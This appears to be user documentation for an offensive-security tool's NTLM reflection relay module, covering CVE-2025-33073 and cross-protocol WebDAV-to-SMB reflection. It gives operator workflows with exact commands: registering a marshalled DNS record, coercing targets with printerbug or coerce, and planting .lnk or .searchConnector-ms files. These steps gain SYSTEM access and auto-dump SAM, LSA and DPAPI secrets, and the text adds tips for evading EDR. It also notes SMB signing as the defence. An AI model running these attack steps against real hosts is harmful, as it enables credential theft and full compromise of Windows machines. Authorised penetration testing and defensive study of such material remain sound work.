# RelayNTLMReflection Server

The **RelayNTLMReflection** server is the NTLM relay variant aimed at **the same machine
that initiated the connection**. There is no `targets` parameter: the back-end target is
always the peer address of the inbound TCP/IP connection. On a successful relay, OctoPwn
spawns a real interactive **SMB2 client session** authenticated as the relayed account,
back to the originating host — and (by default) immediately runs the same auto-loot pair
as `RELAYSMB`: registry secrets dump and DPAPI master-key extraction.

| Inbound listener (front)                     | Outbound target (back)                       |
| -------------------------------------------- | -------------------------------------------- |
| `smb`, `http`, `https`, `httpproxy`, `mssql` | SMB on the **peer's own IP** (445/TCP)       |

The listener side is **shared** with the rest of the relay family — see the
**"Listener-side parameters (shared)"** section in [`RELAYSMB`](relaysmb.md#listener-side-parameters-shared)
for the full reference.

!!! tip "This is *not* a legacy attack"
    "Reflection" sounds like an MS08-068-era curiosity. It is not — this is the
    **CVE-2025-33073** attack family, disclosed by Synacktiv and RedTeam Pentesting in
    **June 2025** and patched in the June 2025 cumulative update. On a fully-patched
    Windows Server 2022 / Windows 11 host that does **not enforce SMB signing**,
    successful exploitation gives **arbitrary command execution as `NT AUTHORITY\SYSTEM`**
    on the relayed host. Microsoft's June 2025 fix has already been bypassed
    ([CVE-2026-24294](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2026-24294),
    Synacktiv "[Bypassing Windows authentication reflection mitigations for SYSTEM
    shells](https://www.synacktiv.com/publications)" Part 1 / Part 2 — April 2026).
    SMB signing — not the `mrxsmb.sys` patch — is the actual mitigation, and OctoPwn's
    `RELAYNTLMREFLECTION` is the canonical tool for executing this attack.

---

## How it works

The reflection attack now has two distinct branches; this server supports both.

### Branch A — CVE-2025-33073 (the modern, primary path)

1. The attacker creates an AD-integrated DNS A-record whose name carries
   **CredMarshalTargetInfo** (CMTI) marshalled bytes pointing the lookup back at the
   attacker's listener. The recommended form is
   `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` — after CMTI stripping it
   resolves to `localhost`, which matches `SspIsTargetLocalhost` on **any** target
   irrespective of hostname, so a single record covers the whole environment. Any
   low-privilege domain user can register this via the default DNS-add ACL — OctoPwn
   does this from an [LDAP client](../clients/ldap.md) session with
   `dnsadd <marshalled_name> <agent_ip>`.
2. The attacker coerces the target host to authenticate to *that hostname* — e.g.
   `printerbug <marshalled_name>` or `coerce <marshalled_name>` from an
   [SMB client](../clients/smb.md) session, or PetitPotam / EFSRPC / DFSCoerce.
3. The victim's SMB client sees a target whose stripped name (after CMTI
   unmarshalling) matches its **own hostname** — e.g. `srv1`. LSASS marks the
   authentication as a candidate for **NTLM Local Authentication**: the
   `NTLM_NEGOTIATE` message contains the workstation+domain pair, and the
   `NTLM_CHALLENGE` answer carries the `NTLMSSP_NEGOTIATE_LOCAL_CALL` flag.
4. Because the coerced caller is `lsass.exe` running as `SYSTEM`, the local-auth
   protocol stuffs the **SYSTEM token** into the server-side context.
5. `RELAYNTLMREFLECTION` opens an outbound SMB connection back to the peer's IP and
   relays the captured exchange. The originating host's SMB *server* trusts the
   "local authentication" hint and impersonates the SYSTEM token.
6. OctoPwn auto-loots: `regdump2` dumps `SAM` / `LSA` / `DCC` and
   `dpapisecretsremoteregdump` extracts DPAPI master keys via remote registry —
   all running as `NT AUTHORITY\SYSTEM` on the originating host.

The full root-cause analysis is in Synacktiv's write-up:
[NTLM reflection is dead, long live NTLM reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025).

### Branch B — Cross-protocol reflection (HTTP / WebDAV → SMB)

The pre-CVE-2025-33073 path is still useful, especially when you do **not** have a
domain account capable of writing DNS records, or when the target is non-domain-joined:

1. A victim is coerced to authenticate over **HTTP/WebDAV** to the agent's IP — e.g.
   via a `\\agent@80\share\file` UNC (forces the WebClient service to issue an
   HTTP-bound NTLM exchange).
2. `RELAYNTLMREFLECTION` accepts the inbound HTTP NTLM authentication and relays it
   back to the originating host's `445/TCP` (SMB).
3. SMB signing is not enforced on the target → relay succeeds → auto-loot fires.

This is the workflow that the WebClient default-on-workstations (Windows 10/11) keeps
alive even without CVE-2025-33073, because HTTP-bound NTLM does not carry the channel
binding values that an SMB-bound exchange would.

### Mechanics shared by both branches

- The relay handler grabs the **peer address**
  (`authobj.connection_info.get_extra_info('peername')`) — that is the IP that opened
  the TCP connection. There is no separate `targets` parameter.
- Loopback addresses are skipped; each unique peer IP is also tracked in
  `targets_done` so it is relayed only once per session.
- The outbound connection is opened with `nosign=True`. SMB signing on the originating
  host **kills the relay**.
- Successful relays add the captured Net-NTLM hash to the **Credentials Hub** with
  `source = RELAYED`.
- A new **interactive SMB2 client session** is created with `description = RELAYED`
  and bound to the relayed connection via `setup_relay()`. From here every command
  in the [SMB client](../clients/smb.md) — file operations, SCM, Remote Registry,
  secretsdump variants, DPAPI harvesting, etc. — runs as the relayed identity (and,
  for Branch A, as `NT AUTHORITY\SYSTEM` on the relayed host).

!!! info "What the June 2025 patch actually changed"
    Microsoft modified `mrxsmb.sys` (`SmbCeCreateSrvCall`) so the SMB *client* refuses
    to connect to a target name whose buffer contains marshalled target information.
    Branch A above stops working on hosts that have applied the June 2025 cumulative
    update **and** have not been re-broken by a CVE-2026-24294-style follow-up. The
    Synacktiv April 2026 series describes a trivial post-patch LPE bypass; the
    landscape will keep moving. The single defensive control that survives all known
    bypasses is **SMB signing**, which is exactly what this relay's `nosign=True`
    outbound side cannot defeat.

---

## When to reach for this instead of `RELAYSMB`

The two SMB-relaying servers cover different scenarios:

| Use case                                                                        | Use this server                          |
| ------------------------------------------------------------------------------- | ---------------------------------------- |
| You have a list of *target* hosts and a victim authenticating from elsewhere    | [`RELAYSMB`](relaysmb.md)                |
| You want the *originating host* to be both the victim and the relay target      | **`RELAYNTLMREFLECTION`** (this one)     |
| You can write DNS via LDAP and want to chain CVE-2025-33073                     | **`RELAYNTLMREFLECTION`** (this one)     |
| You can coerce a host's WebClient (HTTP) but only its `445` is signing-disabled | **`RELAYNTLMREFLECTION`** (this one)     |
| You want to spray relays at many targets simultaneously                         | [`RELAYSMB`](relaysmb.md)                |

Reflection is the right tool whenever the *attack target* and the *coerced host* are the
same machine — which is the common case for SYSTEM-LPE chains and for opportunistic
poisoning (Spoofer-driven LLMNR/NBT-NS hits will most often be a workstation talking to
a typo of itself).

---

## Operational requirements

The same requirements as the rest of the relay family apply — see
[`RELAYSMB` Operational requirements](relaysmb.md#operational-requirements). Reflection-specific
notes:

- **The agent must be reachable from the victim on the listener port.** The whole point
  is that the *victim* opens the connection to the agent and the agent then opens a
  *new* TCP connection back to the same victim's `445`. The agent therefore needs:
    - An IP the victim can route to (for the inbound side).
    - Outbound `445/TCP` access to the victim (for the relayed side).
- **The victim must accept inbound `445`.** A workstation that has the SMB server
  disabled or firewalled has no inbound side to relay to, even on an unsigned host.
- **For Branch A (CVE-2025-33073):** any low-privilege domain account is enough to
  register the marshalled DNS record; you do *not* need DNS Admin rights on a default
  AD deployment. The DC must be reachable from the agent over LDAP.
- **No `targets` parameter.** Unlike the other relay variants, there is nothing to
  configure on the back-end. The "target list" is whatever IPs happen to connect.

---

## Relay-specific parameters

These are the parameters unique to **`RELAYNTLMREFLECTION`**. See
[`RELAYSMB`](relaysmb.md#listener-side-parameters-shared) for the listener-side parameters
shared by every relay variant.

### Normal parameters

#### `regdump`
Default: `True`. After a successful relay, automatically run `regdump2` against the
originating host (SAM / LSA / DCC / cached secrets via remote registry). Same semantics
as the [`RELAYSMB` `regdump` parameter](relaysmb.md#regdump). For CVE-2025-33073 this
runs as `NT AUTHORITY\SYSTEM` on the target — i.e. you get the local SAM hashes
straight away.

#### `dpapisecrets`
Default: `True`. After a successful relay, automatically run
`dpapisecretsremoteregdump` against the originating host. Same semantics as the
[`RELAYSMB` `dpapisecrets` parameter](relaysmb.md#dpapisecrets).

### Advanced parameters

#### `connectproxy`
Proxy ID for the **outbound** SMB connection back to the originating host. Independent
from `serverproxy`. On WASM this is auto-set to `0` if unset.

---

## Commands

The standard `ScannerConsoleBase` command set applies (`setparam`, `getparam`, `params`,
`info`, `serve`, `stop`, `historylist`, …):

#### `serve`
Bring up the configured listeners and the relay-handler task. Each captured
authentication is shuttled into `handle_smb_relay`, which extracts the peer's IP and
opens an outbound SMB connection back to it.

#### `stop`
Stop all listener tasks and the relay-handler task. Interactive SMB sessions spawned
by previous successful relays are **not** closed.

---

## Typical workflow — CVE-2025-33073 (Branch A)

This is the modern, high-impact path. Three OctoPwn sessions, one chained primitive.

1. **Confirm the target does not enforce SMB signing.** Run
   [`smbsig`](../scanners/smbsig.md) against the candidate host(s). If signing is
   enforced, stop here — the attack will be silently rejected during negotiation.
2. **Register a marshalled DNS record from an LDAP session.** Open an
   [LDAP client](../clients/ldap.md) session against any DC with any low-privilege
   domain account, then:

    ```
    dnsadd localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA <agent_ip>
    ```

    The leading `localhost` part is the trick: after the SMB client strips the CMTI
    marshalled suffix (`1UWhRC...wbEAYBAAAA`, a constant), the remaining target name
    is `localhost`, which matches `SspIsTargetLocalhost` on **every** target host. A
    single record covers your whole engagement — no need to register one per
    hostname.

    DNS replication can take a few minutes; verify with `dnsquerya
    localhost1UWhRC...wbEAYBAAAA.<domain>` from the same LDAP session before
    proceeding.

3. **Start `RELAYNTLMREFLECTION`** on the agent. Default listener config is fine;
   leave `regdump=True` and `dpapisecrets=True` for one-shot SYSTEM loot, or disable
   them for stealthier ops.

4. **Coerce the target with the marshalled name** as the listener. From an
   [SMB client](../clients/smb.md) session against the target:

    ```
    printerbug localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
    ```

    `coerce <marshalled_name>` will fan out across PetitPotam / EFSRPC / DFSCoerce /
    ShadowCoerce / PrinterBug if you want to spray every primitive at once.

5. **Watch the relay console.** A successful relay prints
   `New client connected from: <IP>` followed by `SMB relay worked!` and a new
   session ID. The new session is a SMB2 client connected back to the target,
   running as `SYSTEM`. Auto-loot dumps the local SAM / LSA / DPAPI immediately.

## Typical workflow — Cross-protocol via WebClient (Branch B)

Use this when DNS-write is unavailable, or against non-domain-joined hosts where
Branch A doesn't apply.

1. Confirm the target's WebClient service is running (defaults to on for Windows
   10/11 workstations) and that SMB signing is not enforced.
2. Start `RELAYNTLMREFLECTION` with the default listeners (HTTP on `80` is the
   one that matters here).
3. Coerce the target via a WebDAV-style UNC. Either:
    - drop a `.searchConnector-ms` / `.url` / `.lnk` referencing
      `\\agent@80\share\trigger` somewhere the victim will browse, or
    - issue a coercion that the WebClient will resolve over HTTP — `printerbug
      agent@80` aimed at the target itself works on hosts where the WebClient
      service is up.
4. The HTTP-bound NTLM exchange lands on the agent's HTTP listener; the relay
   pipes it back into a fresh SMB connection on the originating host's `445`,
   which (with signing not enforced) accepts it.
5. From here the workflow is identical to Branch A: a new SMB2 session opens,
   auto-loot fires.

---

## Limitations & gotchas

- **SMB signing on the target kills the relay.** This is the one mitigation that
  defeats every known reflection variant — pre-filter with
  [`smbsig`](../scanners/smbsig.md) and concentrate on hosts where signing is
  *not enforced*.
- **June 2025 cumulative update breaks Branch A.** Patched hosts will reject the
  inbound coercion before authentication even reaches the agent (`mrxsmb.sys`
  refuses to dial a marshalled target name). On those hosts, fall back to Branch B
  or wait for the next public bypass — the Synacktiv April 2026 series and
  CVE-2026-24294 demonstrate the cat-and-mouse is far from over.
- **DNS replication is slow.** `dnsadd` writes to the AD-integrated DNS partition;
  it can take **minutes** for the new record to be visible from the target.
  Confirm with `dnsquerya` before coercion.
- **Each peer IP is dedup'd in `targets_done`.** Restart the relay session to
  reprocess the same IP.
- **Loopback skip.** If a process on the agent itself authenticates to the agent's
  listener, the relay is dropped (the loopback check). This is intentional
  protection against accidental self-loop, but means you cannot use this server to
  attack the agent host itself.
- **Auto-loot is loud.** `regdump` + `dpapisecrets` chained on every successful
  relay is highly visible to EDR. Disable both for stealthier engagements and run
  the dumps manually from the spawned session.
- **No `targets` parameter.** If you want to relay to a *specific* set of hosts
  rather than back-at-source, use [`RELAYSMB`](relaysmb.md) instead.

---

## Further reading

- Synacktiv — [NTLM reflection is dead, long live NTLM reflection! — An in-depth
  analysis of CVE-2025-33073](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025.html)
  (June 2025).
- RedTeam Pentesting — [A Look in the Mirror: The Reflective Kerberos Relay
  Attack](https://blog.redteam-pentesting.de/2025/reflective-kerberos-relay-attack/)
  (independent CVE-2025-33073 disclosure).
- Praetorian — [Microsoft: NTLM Reflection Against Windows SMB Client ("the
  One-Hop Problem")](https://www.praetorian.com/advisories/windows-smb-ntlm-reflection-one-hop/).
- Zero Networks — [Examining Relay Attacks Through the Lens of
  CVE-2025-33073](https://zeronetworks.com/blog/examining-relay-attacks-through-the-lens-of-cve-2025-33073).
- Synacktiv — *Bypassing Windows authentication reflection mitigations for SYSTEM
  shells*, [Part 1](https://www.synacktiv.com/publications) /
  [Part 2](https://www.synacktiv.com/publications) (April 2026 — post-patch
  bypasses).
